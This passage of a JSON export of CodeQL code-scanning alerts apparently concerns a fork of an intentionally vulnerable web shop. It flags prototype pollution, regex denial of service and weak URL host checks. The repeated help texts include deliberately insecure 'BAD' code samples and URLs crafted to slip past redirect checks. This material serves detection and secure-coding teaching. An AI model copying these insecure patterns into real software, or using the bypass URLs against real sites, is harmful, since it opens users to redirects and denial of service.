GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."
        },
        "location": {
          "path": "routes/vulnCodeFixes.ts",
          "start_line": 39,
          "end_line": 39,
          "start_column": 13,
          "end_column": 16
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/105/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 104,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/104",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/104",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/remote-property-injection",
        "severity": "warning",
        "description": "Remote property injection",
        "name": "js/remote-property-injection",
        "tags": [
          "external/cwe/cwe-250",
          "external/cwe/cwe-400",
          "security"
        ],
        "full_description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
        "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."
        },
        "location": {
          "path": "lib/insecurity.ts",
          "start_line": 77,
          "end_line": 77,
          "start_column": 16,
          "end_column": 28
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/104/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 103,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/103",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/103",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/remote-property-injection",
        "severity": "warning",
        "description": "Remote property injection",
        "name": "js/remote-property-injection",
        "tags": [
          "external/cwe/cwe-250",
          "external/cwe/cwe-400",
          "security"
        ],
        "full_description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
        "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."
        },
        "location": {
          "path": "lib/insecurity.ts",
          "start_line": 76,
          "end_line": 76,
          "start_column": 19,
          "end_column": 24
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/103/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 102,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/102",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/102",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/remote-property-injection",
        "severity": "warning",
        "description": "Remote property injection",
        "name": "js/remote-property-injection",
        "tags": [
          "external/cwe/cwe-250",
          "external/cwe/cwe-400",
          "security"
        ],
        "full_description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
        "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."
        },
        "location": {
          "path": "lib/accuracy.ts",
          "start_line": 63,
          "end_line": 63,
          "start_column": 12,
          "end_column": 24
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/102/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 101,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/101",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/101",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/remote-property-injection",
        "severity": "warning",
        "description": "Remote property injection",
        "name": "js/remote-property-injection",
        "tags": [
          "external/cwe/cwe-250",
          "external/cwe/cwe-400",
          "security"
        ],
        "full_description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
        "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "A property name to write to depends on a user-provided value."
        },
        "location": {
          "path": "frontend/src/app/oauth/oauth.component.ts",
          "start_line": 65,
          "end_line": 65,
          "start_column": 14,
          "end_column": 17
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/101/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 100,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/100",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/100",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/polynomial-redos",
        "severity": "warning",
        "description": "Polynomial regular expression used on uncontrolled data",
        "name": "js/polynomial-redos",
        "tags": [
          "external/cwe/cwe-1333",
          "external/cwe/cwe-400",
          "external/cwe/cwe-730",
          "security"
        ],
        "full_description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
        "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This regular expression that depends on a user-provided value may run slow on strings with many repetitions of 'a'."
        },
        "location": {
          "path": "routes/profileImageUrlUpload.ts",
          "start_line": 19,
          "end_line": 19,
          "start_column": 11,
          "end_column": 62
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/100/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 99,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/99",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/99",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/incomplete-url-substring-sanitization",
        "severity": "warning",
        "description": "Incomplete URL substring sanitization",
        "name": "js/incomplete-url-substring-sanitization",
        "tags": [
          "correctness",
          "external/cwe/cwe-020",
          "security"
        ],
        "full_description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
        "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "'://htmledit.squarefree.com' can be anywhere in the URL, and arbitrary hosts may come before or after it."
        },
        "location": {
          "path": "routes/updateUserProfile.ts",
          "start_line": 24,
          "end_line": 24,
          "start_column": 16,
          "end_column": 75
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/99/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 98,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/98",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/98",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/incomplete-url-substring-sanitization",
        "severity": "warning",
        "description": "Incomplete URL substring sanitization",
        "name": "js/incomplete-url-substring-sanitization",
        "tags": [
          "correctness",
          "external/cwe/cwe-020",
          "security"
        ],
        "full_description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
        "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: 